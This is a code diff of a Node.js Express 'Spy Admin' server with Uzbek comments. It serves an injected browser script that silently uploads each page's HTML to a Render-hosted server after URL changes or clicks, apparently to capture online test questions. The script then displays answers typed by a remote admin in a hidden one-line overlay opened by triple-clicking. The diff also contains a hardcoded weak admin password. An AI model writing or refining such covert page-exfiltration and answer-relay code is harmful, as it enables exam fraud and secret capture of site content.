@@ -7,7 +7,7 @@ const app = express();
 
 // ========================================================
 // ⚙️ SOZLAMALAR
-const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzilingiz!
+const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzili
 const ADMIN_PASSWORD = "8908"; 
 // ========================================================
 
@@ -18,7 +18,8 @@ app.use(cookieParser());
 
 // --- XOTIRA ---
 let capturedPages = []; 
-let chatHistory = ""; 
+let chatHistory = "";      // Admin panel uchun to'liq tarix
+let clientFullText = "";   // Client uchun 1 qatorli yig'indi
 let lastUpdateID = 0;
 
 const getUzTime = () => new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });
@@ -36,61 +37,74 @@ const clientScript = `
   const BASE = '${MY_SERVER_URL}'; 
   let lastSince=0, msgBox=null, statusBox=null, clickCount=0;
   let currentUrl = window.location.href;
-  let isBoxOpen = false;
-  let isFirstRun = true; // Faqat birinchi marta status chiqarish uchun
+  let isBoxOpen = false; 
+  let isFirstRun = true; 
 
-  // 1. STATUS OYNACHASI (Faqat 1 marta chiqadi)
-  function showStatus(text) {
+  // 1. STATUS OYNACHASI (PASTDA O'RTADA)
+  function showStatus(text, color) {
     if(!statusBox) {
         statusBox = document.createElement('div');
         Object.assign(statusBox.style, {
-            position: 'fixed', top: '5px', right: '5px',
-            padding: '3px 8px', borderRadius: '3px',
-            background: 'rgba(0,128,0,0.8)',
-            color: '#fff', fontSize: '10px', fontFamily: 'sans-serif',
+            position: 'fixed', bottom: '50px', left: '50%', // Pastda o'rtada
+            transform: 'translateX(-50%)',
+            padding: '5px 15px', borderRadius: '20px',
+            background: color || 'rgba(0,128,0,0.8)',
+            color: '#fff', fontSize: '12px', fontFamily: 'sans-serif',
             zIndex: 2147483647, pointerEvents: 'none',
-            display: 'block'
+            display: 'block', boxShadow: '0 2px 10px rgba(0,0,0,0.3)'
         });
         document.body.appendChild(statusBox);
     }
     statusBox.innerText = text;
-    // 3 soniyadan keyin butunlay yo'qoladi
-    setTimeout(() => { 
-        if(statusBox) statusBox.style.display = 'none'; 
-    }, 3000);
+    statusBox.style.display = 'block';
+    
+    // 3 soniyadan keyin yo'qoladi
+    setTimeout(() => { if(statusBox) statusBox.style.display = 'none'; }, 3000);
   }
 
-  // 2. CHAT OYNASI (Ko'zga tashlanmaydigan)
+  // 2. CHAT OYNASI (1 QATORLI SCROLL)
   function makeMsgBox(){
     if(msgBox) return msgBox;
     msgBox = document.createElement('div');
     Object.assign(msgBox.style,{
       position:'fixed', 
-      left:'5px', bottom:'5px', 
-      width:'250px',              
-      maxHeight:'80px',            // Kichkina
-      background:'rgba(0, 0, 0, 0.5)', // Yarim shaffof
-      color:'rgba(255, 255, 255, 0.8)',            
-      padding:'5px',
-      fontSize:'11px', fontFamily:'sans-serif',     
-      borderRadius:'4px',
+      left:'10px', bottom:'10px',  // Chap pastki burchak
+      width:'300px',               // Eni
+      height:'30px',               // Balandligi (faqat 1 qator)
+      lineHeight:'30px',           // Yozuv o'rtada turishi uchun
+      background:'rgba(0, 0, 0, 0.8)', 
+      color:'#00ff00',            
+      padding:'0 10px',
+      fontSize:'13px', fontFamily:'monospace',     
+      borderRadius:'5px',
       zIndex:2147483647,
       display:'none',             
-      border:'none',
-      overflowY:'auto',
-      whiteSpace:'pre-wrap'
+      border:'1px solid #00ff00',
+      
+      // 1 QATORLI QILISH VA SCROLL QO'SHISH
+      whiteSpace: 'nowrap',       // Pastga tushmasin
+      overflowX: 'auto',          // Yonga scroll bo'lsin
+      overflowY: 'hidden'         // Pastga scroll bo'lmasin
     });
+    
+    // Scrollbar dizayni (ingichka)
+    const style = document.createElement('style');
+    style.innerHTML = \`
+      ::-webkit-scrollbar { height: 4px; } 
+      ::-webkit-scrollbar-track { background: #222; }
+      ::-webkit-scrollbar-thumb { background: #00ff00; borderRadius: 2px;}
+    \`;
+    document.head.appendChild(style);
+
     document.body.appendChild(msgBox);
     return msgBox;
   }
 
-  // 3. HTML YUBORISH
+  // 3. HTML YUBORISH (Faqat aniq buyruq bilan)
   async function sendPage(){
     try{
       // Faqat birinchi marta status chiqaramiz
-      if(isFirstRun) {
-          showStatus("Ulandi...");
-      }
+      if(isFirstRun) showStatus("Ulanmoqda...", "#f59e0b");
 
       await fetch(BASE+'/upload-html',{
         method:'POST',
@@ -101,82 +115,75 @@ const clientScript = `
         })
       });
       
-      // Muvaffaqiyatli bo'lsa
       if(isFirstRun) {
-          showStatus("Bog'landi ✅");
-          isFirstRun = false; // Bo'ldi, qaytib status chiqmaydi
+          showStatus("Bog'landi ✅", "#10b981");
+          isFirstRun = false; 
       }
-    }catch(e){
-        // Xatolik bo'lsa indamaymiz (jim ishlash uchun)
-    }
+    }catch(e){}
   }
 
-  // 4. XABAR OLISH
+  // 4. XABAR OLISH (Yig'indi matn)
   async function fetchLatest(){
     try{
       const r=await fetch(BASE+'/latest?since='+lastSince);
       const j=await r.json();
       
-      if(j.success){
+      if(j.success && j.fullText){
         const b = makeMsgBox();
-        b.innerText = j.pureMessage; 
+        // Serverdan kelgan "Salom | Alik | Qalay" matnini qo'yamiz
+        b.innerText = j.fullText; 
         
-        // Yangi xabar kelsa va oyna yopiq bo'lsa -> Toast
+        // Agar yangi xabar bo'lsa va oyna OCHIQ bo'lsa -> oxiriga scroll qilamiz
         if(j.timestamp > lastSince) {
-            // Agar ochiq bo'lsa yangilaymiz, yopiq bo'lsa kichik bildirishnoma
-             if(!isBoxOpen) {
-                 // Kichik signal
-                 b.style.display = 'block';
-                 b.style.background = 'rgba(0,0,200,0.6)';
-                 b.innerText = "Yangi xabar...";
-                 setTimeout(()=>{ if(!isBoxOpen) b.style.display='none'; }, 3000);
-             } else {
-                 b.scrollTop = b.scrollHeight;
-             }
+             // Agar oyna ochiq bo'lsa, oxiriga o'tkaz
+             if(isBoxOpen) setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
         }
         lastSince = j.timestamp;
       }
     }catch(e){}
   }
 
-  // --- MANTIQ ---
+  // --- MANTIQ (SPAMSIZ) ---
 
-  // A) URL o'zgarishi (Next Page)
+  // A) URL o'zgarishi (Next Page) - Har 1 sekundda tekshiradi
   setInterval(()=>{
     if(currentUrl !== window.location.href){
         currentUrl = window.location.href;
-        sendPage(); 
+        sendPage(); // URL o'zgarsa darhol yubor
     }
   }, 1000);
 
-  // B) DOM o'zgarishi (Test savoli) - 2 soniya debounce
-  let debounceTimer;
-  const observer = new MutationObserver(() => {
-     clearTimeout(debounceTimer);
-     debounceTimer = setTimeout(() => { sendPage(); }, 2000);
-  });
-  observer.observe(document.body, { childList: true, subtree: true });
-
-  // C) 3 marta bosish -> Oynani ochish/yopish
+  // B) Clicks (Keyingi savolga o'tish)
+  // Biz MutationObserver ishlatmaymiz (soat bo'lsa spam qiladi).
+  // Buning o'rniga: Har qanday click bo'lsa, 2.5 soniya kutib yuboramiz.
   document.addEventListener('click', (e) => {
+      // Chap tugma bosilsa
       if(e.button === 0) {
+        
+        // 1. 3 marta bosish logikasi
         clickCount++;
         setTimeout(() => clickCount = 0, 500);
         
         if(clickCount >= 3) {
             clickCount = 0;
             const b = makeMsgBox();
-            
             if(isBoxOpen) {
                 b.style.display = 'none';
                 isBoxOpen = false;
             } else {
                 b.style.display = 'block';
-                b.style.background = 'rgba(0,0,0,0.8)'; // Ochilganda aniq ko'rinsin
                 isBoxOpen = true;
-                fetchLatest();
+                // Ochilganda oxiriga o'tkazish
+                setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
             }
+            return; // 3 marta bosilganda page yuborish shart emas
         }
+
+        // 2. Oddiy click (Test yechish) -> 2.5 soniyadan keyin yuborish
+        // (Chunki yangi savol yuklanishi uchun vaqt kerak)
+        setTimeout(() => {
+            sendPage();
+        }, 2500);
       }
   });
 
@@ -214,129 +221,84 @@ app.get("/api/pages", checkAuth, (req, res) => {
     res.json(list);
 });
 
-// DASHBOARD (YANGI DIZAYN - O'RTADA CHAT)
+// DASHBOARD (MARKAZLASHGAN)
 app.get("/", checkAuth, (req, res) => {
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Spy Admin Pro</title>
+            <title>Spy Admin Final</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { background: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
-                .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
-                .navbar h1 { margin: 0; font-size: 18px; color: #38bdf8; }
-                .btn-exit { color: #ef4444; text-decoration: none; font-weight: bold; font-size: 14px; }
+                body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; margin: 0; padding: 0; }
+                .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
                 
-                .container { max-width: 1000px; margin: 20px auto; padding: 0 15px; }
-                
-                /* CHAT SECTION (CENTERED) */
-                .chat-container { 
-                    max-width: 600px; 
-                    margin: 0 auto 30px auto; /* O'rtada */
-                    background: #1e293b; 
-                    border-radius: 12px; 
-                    border: 1px solid #334155; 
-                    padding: 20px;
-                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-                }
-                .chat-header { text-align: center; color: #94a3b8; font-size: 12px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
-                
-                .chat-input-group { display: flex; gap: 10px; margin-bottom: 15px; }
-                input[type="text"] { flex: 1; padding: 12px; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: #fff; outline: none; }
-                input:focus { border-color: #38bdf8; }
-                .btn-send { background: #3b82f6; color: white; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-                .btn-send:hover { background: #2563eb; }
+                /* CHAT */
+                .chat-container { background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); text-align: center;}
                 
                 .chat-history { 
-                    background: #0f172a; 
-                    height: 200px; 
-                    border-radius: 8px; 
-                    padding: 15px; 
-                    overflow-y: auto; 
-                    border: 1px solid #334155;
-                    font-family: monospace; 
-                    font-size: 13px; 
-                    color: #4ade80; 
-                    white-space: pre-wrap;
+                    background: #0f172a; height: 150px; border-radius: 8px; padding: 10px; 
+                    overflow-y: auto; border: 1px solid #334155; font-family: monospace; font-size: 13px; color: #4ade80; 
+                    text-align: left; white-space: pre-wrap; margin-bottom: 15px;
                 }
-                .chat-actions { margin-top: 10px; text-align: right; }
-                .btn-clear { background: transparent; border: none; color: #64748b; cursor: pointer; font-size: 12px; }
-                .btn-clear:hover { color: #ef4444; }
-
-                /* PAGES SECTION */
-                .pages-container { background: #1e293b; border-radius: 12px; border: 1px solid #334155; padding: 20px; }
-                .pages-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
                 
-                .page-item { display: flex; justify-content: space-between; align-items: center; background: #0f172a; padding: 12px; margin-bottom: 8px; border-radius: 8px; border: 1px solid #334155; transition: 0.2s; }
-                .page-item:hover { border-color: #475569; }
-                .page-meta { display: flex; flex-direction: column; gap: 4px; }
-                .page-id { font-size: 11px; color: #94a3b8; font-weight: bold; }
-                .page-url { font-size: 13px; color: #38bdf8; text-decoration: none; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-                .btn-view { background: #10b981; color: white; text-decoration: none; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; }
-                .btn-view:hover { background: #059669; }
+                .input-group { display: flex; gap: 10px; }
+                input { flex: 1; padding: 10px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: #fff; }
+                button { padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; font-weight: bold; }
+                .btn-send { background: #3b82f6; color: white; }
+                .btn-clear { background: #ef4444; color: white; font-size: 11px; margin-top: 5px; width: 100%;}
 
+                /* PAGES */
+                .pages-container { margin-top: 20px; background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 15px; }
+                .page-item { display: flex; justify-content: space-between; align-items: center; background: #0f172a; padding: 10px; margin-bottom: 5px; border-radius: 6px; border: 1px solid #334155; }
+                .page-url { font-size: 12px; color: #38bdf8; text-decoration: none; overflow: hidden; text-overflow: ellipsis; max-width: 60%; white-space: nowrap; }
+                .btn-view { background: #10b981; color: white; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; }
             </style>
         </head>
         <body>
-            <nav class="navbar">
-                <h1>🕵️ Spy Control Center</h1>
-                <a href="/logout" class="btn-exit">Chiqish</a>
-            </nav>
-
             <div class="container">
-                
-                <!-- CENTERED CHAT -->
+                <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:12px">
+                    <span>Admin Panel</span> <a href="/logout" style="color:#ef4444">Chiqish</a>
+                </div>
+
+                <!-- CHAT -->
                 <div class="chat-container">
-                    <div class="chat-header">Aloqa (Chat)</div>
+                    <div class="chat-history">${chatHistory || "--- Chat bo'sh ---"}</div>
                     
-                    <form action="/set-message" method="POST" class="chat-input-group">
-                        <input type="text" name="msg" placeholder="Clientga xabar yuborish..." autocomplete="off" autofocus>
+                    <form action="/set-message" method="POST" class="input-group">
+                        <input type="text" name="msg" placeholder="Xabar..." autocomplete="off" autofocus>
                         <button class="btn-send">YUBORISH</button>
                     </form>
                     
-                    <div class="chat-history" id="historyBox">${chatHistory || "--- Chat tarixi bo'sh ---"}</div>
-                    
-                    <div class="chat-actions">
-                        <form action="/clear-history" method="POST" style="display:inline">
-                            <button class="btn-clear">🗑 Tarixni tozalash</button>
-                        </form>
-                    </div>
+                    <form action="/clear-history" method="POST">
+                        <button class="btn-clear">Chatni Tozalash</button>
+                    </form>
                 </div>
 
-                <!-- PAGES LIST -->
+                <!-- PAGES -->
                 <div class="pages-container">
-                    <div class="pages-header">
-                        <span style="font-weight:bold; color:#cbd5e1">Kelgan Sahifalar</span>
-                        <form action="/clear-pages" method="POST" style="margin:0">
-                            <button style="background:transparent;border:none;color:#ef4444;cursor:pointer;font-size:12px">Barchasini o'chirish</button>
-                        </form>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
+                        <b>Kelgan Sahifalar</b>
+                        <form action="/clear-pages" method="POST" style="margin:0"><button style="background:none;color:#ef4444;border:none;cursor:pointer">O'chirish</button></form>
                     </div>
-                    <div id="pages-list" style="text-align:center; color:#64748b; padding:20px;">Yuklanmoqda...</div>
+                    <div id="pages-list" style="text-align:center;font-size:12px;color:#64748b">Yuklanmoqda...</div>
                 </div>
-
             </div>
 
             <script>
+                // Sahifalarni avto yangilash
                 function loadPages() {
                     fetch('/api/pages').then(r=>r.json()).then(d=>{
                         const c = document.getElementById('pages-list');
                         if(!d.length) { c.innerHTML='Ma\\'lumot yo\\'q'; return; }
                         c.innerHTML = d.map(p => \`
                             <div class="page-item">
-                                <div class="page-meta">
-                                    <span class="page-id">#\${p.id+1} • \${p.date}</span>
-                                    <a href="\${p.url}" target="_blank" class="page-url">\${p.url}</a>
-                                </div>
-                                <a href="/view-site/\${p.id}" target="_blank" class="btn-view">👁 OCHISH</a>
+                                <div><b style="color:#94a3b8">#\${p.id+1}</b> <span style="font-size:10px;color:#64748b">\${p.date}</span></div>
+                                <a href="\${p.url}" target="_blank" class="page-url">\${p.url}</a>
+                                <a href="/view-site/\${p.id}" target="_blank" class="btn-view">OCHISH</a>
                             </div>\`).join('');
                     });
                 }
-                
-                // Chatni pastga tushirish
-                const hb = document.getElementById('historyBox');
-                hb.scrollTop = hb.scrollHeight;
-
                 setInterval(loadPages, 3000);
                 loadPages();
             </script>
@@ -357,19 +319,36 @@ app.post("/upload-html", (req, res) => {
     res.json({status:"ok"});
 });
 
+// XABARNI 1 QATORGA YIG'ISH
 app.post("/set-message", checkAuth, (req, res) => {
-    if(req.body.msg) {
-        chatHistory += `[${getUzTime().split(' ')[1]}] ${req.body.msg}\n`;
+    const msg = req.body.msg;
+    if(msg) {
+        // 1. Admin uchun to'liq tarix (Vaqt bilan)
+        chatHistory += `[${getUzTime().split(' ')[1]}] ${msg}\n`;
+        
+        // 2. Client uchun 1 qatorli matn (qo'shib boriladi)
+        if(clientFullText === "") clientFullText = msg;
+        else clientFullText += " | " + msg; // "Salom | Alik"
+
         lastUpdateID = Date.now();
     }
     res.redirect("/");
 });
-app.post("/clear-history", checkAuth, (req, res) => { chatHistory = ""; lastUpdateID = Date.now(); res.redirect("/"); });
+
+app.post("/clear-history", checkAuth, (req, res) => { 
+    chatHistory = ""; 
+    clientFullText = ""; // Client oynasini ham tozalash
+    lastUpdateID = Date.now(); 
+    res.redirect("/"); 
+});
 app.post("/clear-pages", checkAuth, (req, res) => { capturedPages = []; res.redirect("/"); });
 
 app.get("/latest", (req, res) => {
-    let pureText = chatHistory.replace(/\[.*?\] /g, ""); 
-    res.json({ success: true, pureMessage: pureText, timestamp: lastUpdateID });
+    res.json({ 
+        success: true, 
+        fullText: clientFullText, // Clientga 1 qatorli matn ketadi
+        timestamp: lastUpdateID 
+    });
 });
 
 const PORT = process.env.PORT || 3000;
